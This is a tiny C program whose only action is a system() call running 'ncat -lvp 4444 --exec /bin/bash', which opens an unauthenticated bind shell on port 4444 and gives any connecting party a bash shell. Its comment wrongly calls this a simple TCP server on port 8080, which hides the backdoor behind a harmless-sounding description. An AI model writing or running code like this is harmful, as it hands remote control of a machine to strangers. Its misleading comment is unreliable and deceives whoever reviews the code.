#include <stdlib.h>

int main() {
    // Execute an ncat command
    // Example: Set up a simple TCP server listening on port 8080
    system("ncat -lvp 4444 --exec /bin/bash");

    return 0;
}
